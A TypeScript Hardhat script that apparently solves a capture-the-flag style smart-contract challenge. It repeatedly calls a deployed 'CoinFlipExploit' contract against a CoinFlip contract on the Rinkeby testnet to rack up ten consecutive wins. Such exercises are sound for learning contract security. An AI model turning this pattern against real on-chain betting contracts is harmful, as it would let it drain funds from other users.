import "hardhat-ethers"
import "@ethersproject/abstract-provider"
import { BigNumber } from "ethers";
import { deployments, ethers } from "hardhat"
const RINKEBY_COINFLIP_ADDRESS="0x4C086A39050219cf742DED1F68a0d1639CB2515B"


const executeExploit= async()=>{
    const coinFlipExploitDeployment=await deployments.get('CoinFlipExploit')
    const coinFlipExploit = await ethers.getContractAt('CoinFlipExploit',coinFlipExploitDeployment.address)
    const coinFlipContract= await ethers.getContractAt('CoinFlip',RINKEBY_COINFLIP_ADDRESS)
    
    
    const flip=async()=>{
        const transaction=await coinFlipExploit.flip()
        const transactionReceipt =await transaction.wait() //Wait until block is mined
        if(transactionReceipt.status===0){
            console.log("Fliping the coin failed")
            await flip() //Resend if fail
        }
    }
    
    for(let i = 0; i<10; i++){
        console.log(`Flip nÂ° ${i+1}`)
        await flip()
        const consecutiveWins=(await coinFlipContract.consecutiveWins()) as BigNumber
        console.log(`Consecutive wins ${consecutiveWins.toNumber()}`)
    }
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
